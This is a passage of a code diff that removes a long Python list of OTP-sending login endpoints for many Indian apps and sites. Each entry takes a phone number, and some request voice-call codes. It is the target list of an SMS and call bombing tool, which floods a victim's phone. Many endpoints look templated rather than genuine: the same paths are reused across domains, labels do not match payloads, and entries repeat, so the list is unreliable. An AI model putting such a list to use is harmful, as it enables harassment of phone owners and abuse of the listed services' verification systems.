-    {'name': 'Jupiter Call', 'url': 'https://jupiter.money/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Blinkit SMS', 'url': 'https://blinkit.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Khatabook Call', 'url': 'https://khatabook.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Newme SMS', 'url': 'https://newme.asia/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Myntra WhatsApp', 'url': 'https://myntra.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Paytm WhatsApp', 'url': 'https://paytm.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Dmart SMS', 'url': 'https://dmart.ready.in/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Gokwik Call', 'url': 'https://gokwik.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Nykaa SMS', 'url': 'https://nykaa.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Ajio Call', 'url': 'https://ajio.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Cred WhatsApp', 'url': 'https://cred.club/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Jupiter Call', 'url': 'https://jupiter.money/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Jupiter SMS', 'url': 'https://jupiter.money/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Zomato SMS', 'url': 'https://zomato.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Ajio SMS', 'url': 'https://ajio.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Flipkart Call', 'url': 'https://flipkart.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Zomato WhatsApp', 'url': 'https://zomato.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Zomato Call', 'url': 'https://zomato.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Makemytrip SMS', 'url': 'https://makemytrip.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Olacabs Call', 'url': 'https://olacabs.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Blinkit Call', 'url': 'https://blinkit.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Ajio SMS', 'url': 'https://ajio.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Myntra SMS', 'url': 'https://myntra.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Rapido Call', 'url': 'https://rapido.bike/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Doubtnut Call', 'url': 'https://doubtnut.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Meesho WhatsApp', 'url': 'https://meesho.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Zivame Call', 'url': 'https://zivame.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Paytm WhatsApp', 'url': 'https://paytm.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Gokwik Call', 'url': 'https://gokwik.co/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Oyorooms Call', 'url': 'https://oyorooms.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': '1Mg SMS', 'url': 'https://1mg.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Zepto Call', 'url': 'https://zepto.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Doubtnut Call', 'url': 'https://doubtnut.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Zepto SMS', 'url': 'https://zepto.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Amazon Call', 'url': 'https://amazon.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Doubtnut Call', 'url': 'https://doubtnut.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Ajio SMS', 'url': 'https://ajio.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Zomato Call', 'url': 'https://zomato.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Ajio SMS', 'url': 'https://ajio.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Pokerbaazi WhatsApp', 'url': 'https://pokerbaazi.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Nykaa SMS', 'url': 'https://nykaa.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Myntra Call', 'url': 'https://myntra.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Uber WhatsApp', 'url': 'https://uber.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Flipkart Call', 'url': 'https://flipkart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Instamart WhatsApp', 'url': 'https://instamart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Olacabs SMS', 'url': 'https://olacabs.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Swiggy Call', 'url': 'https://swiggy.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Pokerbaazi Call', 'url': 'https://pokerbaazi.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': '1Mg WhatsApp', 'url': 'https://1mg.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Doubtnut SMS', 'url': 'https://doubtnut.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Zivame SMS', 'url': 'https://zivame.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Phonepe Call', 'url': 'https://phonepe.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Makemytrip Call', 'url': 'https://makemytrip.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Zivame SMS', 'url': 'https://zivame.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Newme Call', 'url': 'https://newme.asia/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Amazon SMS', 'url': 'https://amazon.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Newme SMS', 'url': 'https://newme.asia/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Meesho WhatsApp', 'url': 'https://meesho.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Zepto Call', 'url': 'https://zepto.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Makemytrip WhatsApp', 'url': 'https://makemytrip.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Instamart Call', 'url': 'https://instamart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Api-Gateway WhatsApp', 'url': 'https://api-gateway.juno.lenskart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Uber Call', 'url': 'https://uber.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Cred Call', 'url': 'https://cred.club/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Newme Call', 'url': 'https://newme.asia/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Gokwik SMS', 'url': 'https://gokwik.co/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Bigbasket Call', 'url': 'https://bigbasket.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Tatacapital SMS', 'url': 'https://tatacapital.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Zivame SMS', 'url': 'https://zivame.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Phonepe Call', 'url': 'https://phonepe.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Goibibo SMS', 'url': 'https://goibibo.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Tatacapital Call', 'url': 'https://tatacapital.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Myntra Call', 'url': 'https://myntra.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': '1Mg SMS', 'url': 'https://1mg.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Api-Gateway WhatsApp', 'url': 'https://api-gateway.juno.lenskart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Olacabs SMS', 'url': 'https://olacabs.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Uber SMS', 'url': 'https://uber.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Swiggy WhatsApp', 'url': 'https://swiggy.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Paytm SMS', 'url': 'https://paytm.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Meesho Call', 'url': 'https://meesho.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Api-Gateway SMS', 'url': 'https://api-gateway.juno.lenskart.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Pharmeasy Call', 'url': 'https://pharmeasy.in/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Uber WhatsApp', 'url': 'https://uber.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Wakefit SMS', 'url': 'https://wakefit.co/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Zomato WhatsApp', 'url': 'https://zomato.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Myntra WhatsApp', 'url': 'https://myntra.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Api-Gateway SMS', 'url': 'https://api-gateway.juno.lenskart.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Gokwik Call', 'url': 'https://gokwik.co/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Myntra SMS', 'url': 'https://myntra.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Zepto SMS', 'url': 'https://zepto.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Doubtnut SMS', 'url': 'https://doubtnut.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Tatacapital Call', 'url': 'https://tatacapital.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Shiprocket SMS', 'url': 'https://shiprocket.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Nykaa Call', 'url': 'https://nykaa.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Amazon SMS', 'url': 'https://amazon.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Doubtnut SMS', 'url': 'https://doubtnut.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Flipkart Call', 'url': 'https://flipkart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Bigbasket SMS', 'url': 'https://bigbasket.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Paytm Call', 'url': 'https://paytm.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Meesho SMS', 'url': 'https://meesho.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Dmart WhatsApp', 'url': 'https://dmart.ready.in/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Rapido SMS', 'url': 'https://rapido.bike/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
